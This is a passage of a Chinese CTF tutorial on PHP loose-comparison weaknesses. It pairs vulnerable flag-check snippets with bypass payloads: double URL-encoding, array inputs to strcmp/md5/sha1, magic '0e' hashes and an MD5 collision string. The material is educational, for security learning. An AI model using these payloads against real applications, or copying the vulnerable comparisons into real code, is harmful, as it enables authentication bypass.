+<span class="normal"><a href="#__codelineno-16-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1"></a>var_dump(111 == &quot;111a&quot;);
+<a id="__codelineno-16-2" name="__codelineno-16-2"></a># 返回： true
+<a id="__codelineno-16-3" name="__codelineno-16-3"></a>var_dump(111 == &quot;1a&quot;);
+<a id="__codelineno-16-4" name="__codelineno-16-4"></a># 返回： false
+<a id="__codelineno-16-5" name="__codelineno-16-5"></a>var_dump(100 == &quot;1e2&quot;); #采用科学计数法
+<a id="__codelineno-16-6" name="__codelineno-16-6"></a># 返回：true
+<a id="__codelineno-16-7" name="__codelineno-16-7"></a>var_dump(23333 == &quot;0x5b25&quot;); #采用十六进制
+<a id="__codelineno-16-8" name="__codelineno-16-8"></a># 返回：true
+</code></pre></div></td></tr></table></div>
+<p>在 <strong>PHP8.0.0</strong> 之前（最新版本已修复），如果 <strong>字符串</strong> 与 <strong>数字</strong> 或者 <strong>数字字符串</strong> 进行比较，则会先进行 <strong>类型转换</strong> 再进行比较。</p>
+<p><img alt="img" src="../assets/4089e1-826abf-596de22a00ceb96f87a788cc.png" /></p>
+<p><strong>攻防 PHP2</strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-17-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-17-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-17-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-17-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-17-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-17-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-17-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-17-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-17-10">10</a></span>
+<span class="normal"><a href="#__codelineno-17-11">11</a></span>
+<span class="normal"><a href="#__codelineno-17-12">12</a></span>
+<span class="normal"><a href="#__codelineno-17-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1"></a>&lt;?php
+<a id="__codelineno-17-2" name="__codelineno-17-2"></a>if(&quot;admin&quot;===$_GET[id]) {
+<a id="__codelineno-17-3" name="__codelineno-17-3"></a>  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
+<a id="__codelineno-17-4" name="__codelineno-17-4"></a>  exit();
+<a id="__codelineno-17-5" name="__codelineno-17-5"></a>}
+<a id="__codelineno-17-6" name="__codelineno-17-6"></a>
+<a id="__codelineno-17-7" name="__codelineno-17-7"></a>$_GET[id] = urldecode($_GET[id]);
+<a id="__codelineno-17-8" name="__codelineno-17-8"></a>if($_GET[id] == &quot;admin&quot;)
+<a id="__codelineno-17-9" name="__codelineno-17-9"></a>{
+<a id="__codelineno-17-10" name="__codelineno-17-10"></a>  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
+<a id="__codelineno-17-11" name="__codelineno-17-11"></a>  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;
+<a id="__codelineno-17-12" name="__codelineno-17-12"></a>}
+<a id="__codelineno-17-13" name="__codelineno-17-13"></a>?&gt;
+</code></pre></div></td></tr></table></div>
+<p>把 admin 给 URL 编码一下即可</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1"></a>admin-&gt;%61%64%6d%69%6e
+</code></pre></div></td></tr></table></div>
+<p>但是发现传进去的值会直接给 urldecode，为此在把编码后的 admin 再编码一遍</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1"></a>%61%64%6d%69%6e-&gt;%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
+</code></pre></div></td></tr></table></div>
+<p>传参拿 Flag</p>
+<h3 id="php_4">PHP 弱类型比较<a class="headerlink" href="#php_4" title="Permanent link">&para;</a></h3>
+<p>PHP 是一门弱类型语言，这里是他的类型比较表 https://www.php.net/manual/zh/types.comparisons.php#types.comparisions-loose</p>
+<h4 id="strcmp">strcmp()<a class="headerlink" href="#strcmp" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>https://www.php.net/manual/zh/function.strcmp.php</p>
+</blockquote>
+<p>描述：<strong>strcmp(str1, str2)</strong></p>
+<p>如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p>
+<p><strong>注 5：</strong> 在 php5.0 以前，strcmp 返回的是 str2 第一位字母转成 ascii 后减去 str1 第一位字母。</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span>
+<span class="normal"><a href="#__codelineno-20-2">2</a></span>
+<span class="normal"><a href="#__codelineno-20-3">3</a></span>
+<span class="normal"><a href="#__codelineno-20-4">4</a></span>
+<span class="normal"><a href="#__codelineno-20-5">5</a></span>
+<span class="normal"><a href="#__codelineno-20-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1"></a>var_dump(strcmp(&quot;1&quot;,&quot;2&quot;));
+<a id="__codelineno-20-2" name="__codelineno-20-2"></a># 返回：-1
+<a id="__codelineno-20-3" name="__codelineno-20-3"></a>var_dump(strcmp(&quot;1&quot;,&quot;1&quot;));
+<a id="__codelineno-20-4" name="__codelineno-20-4"></a># 返回：0
+<a id="__codelineno-20-5" name="__codelineno-20-5"></a>var_dump(strcmp(&quot;1&quot;,&quot;0&quot;));
+<a id="__codelineno-20-6" name="__codelineno-20-6"></a># 返回：1
+</code></pre></div></td></tr></table></div>
+<p>当 strcmp 比较出错后，会返回 null，null 则为 0，举个例子</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span>
+<span class="normal"><a href="#__codelineno-21-2">2</a></span>
+<span class="normal"><a href="#__codelineno-21-3">3</a></span>
+<span class="normal"><a href="#__codelineno-21-4">4</a></span>
+<span class="normal"><a href="#__codelineno-21-5">5</a></span>
+<span class="normal"><a href="#__codelineno-21-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1"></a>$flag = &#39;flag{123}&#39;;
+<a id="__codelineno-21-2" name="__codelineno-21-2"></a>if (strcmp($flag, $_GET[&#39;str&#39;]) == 0) {
+<a id="__codelineno-21-3" name="__codelineno-21-3"></a>    echo $flag;
+<a id="__codelineno-21-4" name="__codelineno-21-4"></a>}else{
+<a id="__codelineno-21-5" name="__codelineno-21-5"></a>    echo &quot;Out!&quot;;
+<a id="__codelineno-21-6" name="__codelineno-21-6"></a>}
+</code></pre></div></td></tr></table></div>
+<p>为了使 strcmp 比较出错，可以传入一个数组</p>
+<p>Payload: <strong>?str[]</strong></p>
+<h4 id="is_numeric_1">is_numeric()<a class="headerlink" href="#is_numeric_1" title="Permanent link">&para;</a></h4>
+<p><strong>is_numeric()</strong> 用于检测数值是否为数值，如果遇到这个函数，可以用上述转换类型的特性（版本小于 8.0.0），如果传入的是字符串，会先将字符串转换成数值</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span>
+<span class="normal"><a href="#__codelineno-22-2">2</a></span>
+<span class="normal"><a href="#__codelineno-22-3">3</a></span>
+<span class="normal"><a href="#__codelineno-22-4">4</a></span>
+<span class="normal"><a href="#__codelineno-22-5">5</a></span>
+<span class="normal"><a href="#__codelineno-22-6">6</a></span>
+<span class="normal"><a href="#__codelineno-22-7">7</a></span>
+<span class="normal"><a href="#__codelineno-22-8">8</a></span>
+<span class="normal"><a href="#__codelineno-22-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1"></a>$flag = &#39;flag{111}&#39;;
+<a id="__codelineno-22-2" name="__codelineno-22-2"></a>$id = $_GET[&#39;id&#39;];
+<a id="__codelineno-22-3" name="__codelineno-22-3"></a>if(is_numeric($id) &gt; 0){
+<a id="__codelineno-22-4" name="__codelineno-22-4"></a>    echo &#39;Out!&#39;;
+<a id="__codelineno-22-5" name="__codelineno-22-5"></a>}else{
+<a id="__codelineno-22-6" name="__codelineno-22-6"></a>    if ($id &gt; 233) {
+<a id="__codelineno-22-7" name="__codelineno-22-7"></a>        echo $flag;
+<a id="__codelineno-22-8" name="__codelineno-22-8"></a>    }
+<a id="__codelineno-22-9" name="__codelineno-22-9"></a>}
+</code></pre></div></td></tr></table></div>
+<p>Payload: <strong>?id=2333,</strong></p>
+<p>Payload: <strong>?id=2333%00</strong></p>
+<p>Payload: <strong>?id=2333A</strong></p>
+<p>……</p>
+<h4 id="is_switch">is_switch()<a class="headerlink" href="#is_switch" title="Permanent link">&para;</a></h4>
+<p>这个方法和类型转换一样大同小异，case 会自动将字符转换成数值。这里来个例子就知道了</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-23-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-23-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-23-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-23-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-23-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-23-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-23-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-23-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-23-10">10</a></span>
+<span class="normal"><a href="#__codelineno-23-11">11</a></span>
+<span class="normal"><a href="#__codelineno-23-12">12</a></span>
+<span class="normal"><a href="#__codelineno-23-13">13</a></span>
+<span class="normal"><a href="#__codelineno-23-14">14</a></span>
+<span class="normal"><a href="#__codelineno-23-15">15</a></span>
+<span class="normal"><a href="#__codelineno-23-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1"></a>$a = &quot;233a&quot;; # 注意这里
+<a id="__codelineno-23-2" name="__codelineno-23-2"></a>$flag = &quot;flag{Give you FLAG}&quot;;
+<a id="__codelineno-23-3" name="__codelineno-23-3"></a>switch ($a) {
+<a id="__codelineno-23-4" name="__codelineno-23-4"></a>    case 1:
+<a id="__codelineno-23-5" name="__codelineno-23-5"></a>        echo &quot;No Flag&quot;;
+<a id="__codelineno-23-6" name="__codelineno-23-6"></a>        break;
+<a id="__codelineno-23-7" name="__codelineno-23-7"></a>    case 2:
+<a id="__codelineno-23-8" name="__codelineno-23-8"></a>        echo &quot;No Flag&quot;;
+<a id="__codelineno-23-9" name="__codelineno-23-9"></a>        break;
+<a id="__codelineno-23-10" name="__codelineno-23-10"></a>    case 233:
+<a id="__codelineno-23-11" name="__codelineno-23-11"></a>        echo $flag;
+<a id="__codelineno-23-12" name="__codelineno-23-12"></a>        break;
+<a id="__codelineno-23-13" name="__codelineno-23-13"></a>    default:
+<a id="__codelineno-23-14" name="__codelineno-23-14"></a>        $a = 233;
+<a id="__codelineno-23-15" name="__codelineno-23-15"></a>        echo &quot;Haha...&quot;;
+<a id="__codelineno-23-16" name="__codelineno-23-16"></a>}
+</code></pre></div></td></tr></table></div>
+<p>输出：flag{Give you FLAG}</p>
+<h4 id="md5">md5()<a class="headerlink" href="#md5" title="Permanent link">&para;</a></h4>
+<p>描述：<strong>md5($字符串, $var2)</strong></p>
+<p>计算 <strong>字符串</strong> 的 MD5 散列值，如果 <strong>var2</strong> 为真将返回 16 字符长度的原始二进制格式</p>
+<p><img alt="img" src="../assets/4d342e-990d09-78805a221a988e79ef3f42d7-1024x165.png" /></p>
+<h5 id="0e">==（0e 比较）<a class="headerlink" href="#0e" title="Permanent link">&para;</a></h5>
+<p>md5 在处理哈希字符串的时候，如果 md5 编码后的哈希值时 <strong>0e</strong> （科学计数法）开头的，都一律解释为 0，所以当两个不同的值经过哈希编码后他们的值都是以 <strong>0e</strong> 开头的，则每个值都是 <strong>0</strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span>
+<span class="normal"><a href="#__codelineno-24-2">2</a></span>
+<span class="normal"><a href="#__codelineno-24-3">3</a></span>
+<span class="normal"><a href="#__codelineno-24-4">4</a></span>
+<span class="normal"><a href="#__codelineno-24-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1"></a>var_dump(0e912 == 0e112?1:0);
+<a id="__codelineno-24-2" name="__codelineno-24-2"></a>输出：1
+<a id="__codelineno-24-3" name="__codelineno-24-3"></a>echo 8e5 . &quot;&lt;br&gt;&quot;; // 10^5*8=800000
+<a id="__codelineno-24-4" name="__codelineno-24-4"></a>echo 1e4 . &quot;&lt;br&gt;&quot;; // 10^4*1=10000
+<a id="__codelineno-24-5" name="__codelineno-24-5"></a>echo 0e3 . &quot;&lt;br&gt;&quot;; // 10^3*0=0
+</code></pre></div></td></tr></table></div>
+<h6 id="md5-0e">常见 md5 以 0e 开头的值<a class="headerlink" href="#md5-0e" title="Permanent link">&para;</a></h6>
+<p><strong>数值型</strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-25-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-25-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-25-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-25-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-25-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-25-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-25-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-25-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-25-10">10</a></span>
+<span class="normal"><a href="#__codelineno-25-11">11</a></span>
+<span class="normal"><a href="#__codelineno-25-12">12</a></span>
+<span class="normal"><a href="#__codelineno-25-13">13</a></span>
+<span class="normal"><a href="#__codelineno-25-14">14</a></span>
+<span class="normal"><a href="#__codelineno-25-15">15</a></span>
+<span class="normal"><a href="#__codelineno-25-16">16</a></span>
+<span class="normal"><a href="#__codelineno-25-17">17</a></span>
+<span class="normal"><a href="#__codelineno-25-18">18</a></span>
+<span class="normal"><a href="#__codelineno-25-19">19</a></span>
+<span class="normal"><a href="#__codelineno-25-20">20</a></span>
+<span class="normal"><a href="#__codelineno-25-21">21</a></span>
+<span class="normal"><a href="#__codelineno-25-22">22</a></span>
+<span class="normal"><a href="#__codelineno-25-23">23</a></span>
+<span class="normal"><a href="#__codelineno-25-24">24</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1"></a>240610708 0e462097431906509019562988736854 返回：0
+<a id="__codelineno-25-2" name="__codelineno-25-2"></a>314282422 0e990995504821699494520356953734 返回：0
+<a id="__codelineno-25-3" name="__codelineno-25-3"></a>571579406 0e972379832854295224118025748221 返回：0
+<a id="__codelineno-25-4" name="__codelineno-25-4"></a>903251147 0e174510503823932942361353209384 返回：0
+<a id="__codelineno-25-5" name="__codelineno-25-5"></a>$md5          md5($md5)
+<a id="__codelineno-25-6" name="__codelineno-25-6"></a>0e00275209979 0e551387587965716321018342879905
+<a id="__codelineno-25-7" name="__codelineno-25-7"></a>0e00506035745 0e224441551631909369101555335043
+<a id="__codelineno-25-8" name="__codelineno-25-8"></a>0e00540451811 0e057099852684304412663796608095
+<a id="__codelineno-25-9" name="__codelineno-25-9"></a>0e00678205148 0e934049274119262631743072394111
+<a id="__codelineno-25-10" name="__codelineno-25-10"></a>0e00741250258 0e899567782965109269932883593603
+<a id="__codelineno-25-11" name="__codelineno-25-11"></a>0e00928251504 0e148856674729228041723861799600
+<a id="__codelineno-25-12" name="__codelineno-25-12"></a>0e01350016114 0e769018222125751782256460324867
+<a id="__codelineno-25-13" name="__codelineno-25-13"></a>0e01352028862 0e388419153010508575572061606161
+<a id="__codelineno-25-14" name="__codelineno-25-14"></a>0e01392313004 0e793314107039222217518920037885
+<a id="__codelineno-25-15" name="__codelineno-25-15"></a>0e01875552079 0e780449305367629893512581736357
+<a id="__codelineno-25-16" name="__codelineno-25-16"></a>0e01975903983 0e317084484960342086618161584202
+<a id="__codelineno-25-17" name="__codelineno-25-17"></a>0e02042356163 0e335912055437180460060141819624
+<a id="__codelineno-25-18" name="__codelineno-25-18"></a>0e02218562930 0e151492820470888772364059321579
+<a id="__codelineno-25-19" name="__codelineno-25-19"></a>0e02451355147 0e866503534356013079241759641492
+<a id="__codelineno-25-20" name="__codelineno-25-20"></a>0e02739970294 0e894318228115677783240047043017
+<a id="__codelineno-25-21" name="__codelineno-25-21"></a>0e02760920150 0e413159393756646578537635311046
+<a id="__codelineno-25-22" name="__codelineno-25-22"></a>0e02784726287 0e433955189140949269100965859496
+<a id="__codelineno-25-23" name="__codelineno-25-23"></a>0e03298616350 0e851613188370453906408258609284
+<a id="__codelineno-25-24" name="__codelineno-25-24"></a>0e03393034171 0e077847024281996293485700020358
+</code></pre></div></td></tr></table></div>
+<p><strong>字母型</strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span>
+<span class="normal"><a href="#__codelineno-26-2">2</a></span>
+<span class="normal"><a href="#__codelineno-26-3">3</a></span>
+<span class="normal"><a href="#__codelineno-26-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1"></a>QLTHNDT 0e405967825401955372549139051580 返回：0
+<a id="__codelineno-26-2" name="__codelineno-26-2"></a>QNKCDZO 0e830400451993494058024219903391 返回：0
+<a id="__codelineno-26-3" name="__codelineno-26-3"></a>EEIZDOI 0e782601363539291779881938479162 返回：0
+<a id="__codelineno-26-4" name="__codelineno-26-4"></a>TUFEPMC 0e839407194569345277863905212547 返回：0
+</code></pre></div></td></tr></table></div>
+<p>举个例子</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span>
+<span class="normal"><a href="#__codelineno-27-2">2</a></span>
+<span class="normal"><a href="#__codelineno-27-3">3</a></span>
+<span class="normal"><a href="#__codelineno-27-4">4</a></span>
+<span class="normal"><a href="#__codelineno-27-5">5</a></span>
+<span class="normal"><a href="#__codelineno-27-6">6</a></span>
+<span class="normal"><a href="#__codelineno-27-7">7</a></span>
+<span class="normal"><a href="#__codelineno-27-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1"></a>$flag = &quot;flag{THIS_IS_REAL_FLAG}&quot;;
+<a id="__codelineno-27-2" name="__codelineno-27-2"></a>$v1 = $_GET[&#39;gat&#39;];
+<a id="__codelineno-27-3" name="__codelineno-27-3"></a>$v2 = $_GET[&#39;tag&#39;];
+<a id="__codelineno-27-4" name="__codelineno-27-4"></a>if ($v1 != $v2 &amp;&amp; md5($v1) == md5($v2)) {
+<a id="__codelineno-27-5" name="__codelineno-27-5"></a>    echo $flag;
+<a id="__codelineno-27-6" name="__codelineno-27-6"></a>}else{
+<a id="__codelineno-27-7" name="__codelineno-27-7"></a>    echo &quot;Out!&quot;;
+<a id="__codelineno-27-8" name="__codelineno-27-8"></a>}
+</code></pre></div></td></tr></table></div>
+<p>代码简单说明一下，v1 和 v2 是两个参数变量，首先 v1 不等于 v2，意思就是两个值必须不相同，其次 md5 后的 v1 和 md5 后的 v2 必须相同，这时候就可以使用上述 <strong>0e</strong> 方法构造 Payload，只需找出哪个值经过 md5 编码后以 <strong>0e</strong> 开头即可</p>
+<p>Payload: <strong>?gat=240610708&amp;tag=314282422</strong></p>
+<p><img alt="img" src="../assets/fa774e-f5077a-78805a221a988e79ef3f42d7.png" /></p>
+<h5 id="_10">===（数组比较）<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h5>
+<p>如果遇到下列程序</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1">1</a></span>
+<span class="normal"><a href="#__codelineno-28-2">2</a></span>
+<span class="normal"><a href="#__codelineno-28-3">3</a></span>
+<span class="normal"><a href="#__codelineno-28-4">4</a></span>
+<span class="normal"><a href="#__codelineno-28-5">5</a></span>
+<span class="normal"><a href="#__codelineno-28-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1"></a>$flag = &quot;flag{THIS_IS_REAL_FLAG}&quot;;
+<a id="__codelineno-28-2" name="__codelineno-28-2"></a>$str1 = $_GET[&#39;gat&#39;];
+<a id="__codelineno-28-3" name="__codelineno-28-3"></a>$str2 = $_GET[&#39;tag&#39;];
+<a id="__codelineno-28-4" name="__codelineno-28-4"></a>if (md5($str1) === md5($str2)) {
+<a id="__codelineno-28-5" name="__codelineno-28-5"></a>    echo $flag;
+<a id="__codelineno-28-6" name="__codelineno-28-6"></a>}
+</code></pre></div></td></tr></table></div>
+<p>用上述 0e 方法自然是不可行的（注意：<code>===</code>），这时候就得使用数组来绕过了，如果传入一个数组的值，会报出错误（md5 只能使用字符串），报错后就相当于绕过<code>===</code>这个条件了</p>
+<p>Payload: <strong>?gat[]=&amp;tag[]=</strong></p>
+<p><img alt="img" src="../assets/4d5fc2-a30983-78805a221a988e79ef3f42d7-1024x306.png" /></p>
+<p><strong>注 6：</strong> 在 PHP 8.0.0 时，该方法行不通了</p>
+<p><img alt="img" src="../assets/44d146-16025c-78805a221a988e79ef3f42d7-1024x143.png" /></p>
+<h6 id="md5_1">md5 碰撞<a class="headerlink" href="#md5_1" title="Permanent link">&para;</a></h6>
+<p>如果遇到不能传入数组，只能传入字符串的时候，如下例</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span>
+<span class="normal"><a href="#__codelineno-29-2">2</a></span>
+<span class="normal"><a href="#__codelineno-29-3">3</a></span>
+<span class="normal"><a href="#__codelineno-29-4">4</a></span>
+<span class="normal"><a href="#__codelineno-29-5">5</a></span>
+<span class="normal"><a href="#__codelineno-29-6">6</a></span>
+<span class="normal"><a href="#__codelineno-29-7">7</a></span>
+<span class="normal"><a href="#__codelineno-29-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1"></a>$flag = &quot;flag{THIS_IS_REAL_FLAG}&quot;;
+<a id="__codelineno-29-2" name="__codelineno-29-2"></a>$str1 = $_GET[&quot;gat&quot;];
+<a id="__codelineno-29-3" name="__codelineno-29-3"></a>$str2 = $_GET[&quot;tag&quot;];
+<a id="__codelineno-29-4" name="__codelineno-29-4"></a>if((string)$str1 !== (string)$str2 &amp;&amp; md5($str1)===md5($str2)){
+<a id="__codelineno-29-5" name="__codelineno-29-5"></a>    echo &quot;flag{THIS_IS_REAL_FLAG}&quot;;
+<a id="__codelineno-29-6" name="__codelineno-29-6"></a>}else{
+<a id="__codelineno-29-7" name="__codelineno-29-7"></a>    echo &quot;Out!&quot;;
+<a id="__codelineno-29-8" name="__codelineno-29-8"></a>}
+</code></pre></div></td></tr></table></div>
+<p>这时候就得需要 md5 碰撞，上面判断条件的意思是，str1 和 str2 内容必须不同，但是 md5 必须相同。</p>
+<p><strong>说人话就是 md5 一样，但内容完全不一样的字符串</strong></p>
+<p>关于 md5 碰撞可以翻阅这篇论文：https://www.iacr.org/cryptodb/archive/2005/EUROCRYPT/2868/2868.pdf</p>
+<p>这里我们先用工具跑一下，使用 FastColl 对 md5 进行一个简单碰撞</p>
+<p>首先创建一个文件 1.txt，在里边输入任意值，其次使用命令</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1"></a>fastcoll -p 1.txt -o 2.txt 3.txt
+</code></pre></div></td></tr></table></div>
+<p>分别生成 2.txt 和 3.txt，这时候打开会发现这些是二进制字符串（？）</p>
+<p>接着对这两个文件内容分别进行 <strong>md5 编码</strong> 和 url 编码，会发现 md5 后的编码是一样的</p>
+<p><img alt="img" src="../assets/ea2ec9-278ddc-78805a221a988e79ef3f42d7-1024x460.png" /></p>
+<p>使用工具校验</p>
+<p><img alt="img" src="../assets/84643e-b69d82-78805a221a988e79ef3f42d7.png" /></p>
+<p>接着构造 Payload 即可</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1"></a>?gat=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00b%87%24%8E%A1%E8H%B3y%BF%93%B8U%D2%F0e%1Bih%D3%5CD%2A%0B%FF%21%83%FA%AF-4%CF4%9B%F1%EF%5D%0D%3D%C1%EBE%3A%3B%E8U%7C%3Dm%89%DB%11%B7%BFkr%84.%01h%C0%C3%96%DFr%A5%CF%B4%08%F9%8D%E6a3%22%05%A5%C8%8Be%0F2%A7%96F%0CC%DB%1E%C5%B7f%D0%E6t%EE%E9n%B6G%2A%9B9%A8%FAK%B9i%82%94%E1%FC%F3%A0%5D%B3%7F%C2%23I%FE%9F%C9d%84%B2%F1%03&amp;tag=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00b%87%24%8E%A1%E8H%B3y%BF%93%B8U%D2%F0e%1BihS%5CD%2A%0B%FF%21%83%FA%AF-4%CF4%9B%F1%EF%5D%0D%3D%C1%EBE%3A%3B%E8%D5%7C%3Dm%89%DB%11%B7%BFkr%84.%01%E8%C0%C3%96%DFr%A5%CF%B4%08%F9%8D%E6a3%22%05%A5%C8%8Be%0F2%A7%16F%0CC%DB%1E%C5%B7f%D0%E6t%EE%E9n%B6G%2A%9B9%A8%FAK%B9i%82%14%E1%FC%F3%A0%5D%B3%7F%C2%23I%FE%9F%C9%E4%84%B2%F1%03
+</code></pre></div></td></tr></table></div>
+<p><img alt="img" src="../assets/9f4cac-8222aa-78805a221a988e79ef3f42d7.png" /></p>
+<h4 id="sha1">sha1()<a class="headerlink" href="#sha1" title="Permanent link">&para;</a></h4>
+<p>sha1 的参数不能为数组，传入数组会返回 NULL，所以先传一个数组使得 sha1 函数报错，接着再左右两边传入不一样的内容，两边条件自然=1，相等即可绕过</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-32-1">1</a></span>
+<span class="normal"><a href="#__codelineno-32-2">2</a></span>
+<span class="normal"><a href="#__codelineno-32-3">3</a></span>
+<span class="normal"><a href="#__codelineno-32-4">4</a></span>
+<span class="normal"><a href="#__codelineno-32-5">5</a></span>
+<span class="normal"><a href="#__codelineno-32-6">6</a></span>
+<span class="normal"><a href="#__codelineno-32-7">7</a></span>
+<span class="normal"><a href="#__codelineno-32-8">8</a></span>
+<span class="normal"><a href="#__codelineno-32-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1"></a>$flag = &quot;flag{Chain!}&quot;;
+<a id="__codelineno-32-2" name="__codelineno-32-2"></a>$get = $_GET[&#39;get&#39;];
+<a id="__codelineno-32-3" name="__codelineno-32-3"></a>$teg = $_GET[&#39;teg&#39;];
+<a id="__codelineno-32-4" name="__codelineno-32-4"></a>if ($get != $teg &amp;&amp; sha1($get) === sha1($teg)) {
+<a id="__codelineno-32-5" name="__codelineno-32-5"></a>#if ($get != $teg &amp;&amp; sha1($get) == sha1($teg)) {
+<a id="__codelineno-32-6" name="__codelineno-32-6"></a>    echo $flag;
+<a id="__codelineno-32-7" name="__codelineno-32-7"></a>}else{
+<a id="__codelineno-32-8" name="__codelineno-32-8"></a>    echo &#39;Out!&#39;;
+<a id="__codelineno-32-9" name="__codelineno-32-9"></a>}
+</code></pre></div></td></tr></table></div>
+<p>Payload: <strong>?get[]=&amp;teg[]=1</strong></p>
+<h3 id="_11">变量覆盖漏洞<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<p>变量如果未被初始化，且能够被用户所控制，那么很可能会导致安全问题，前提是环境开启了</p>
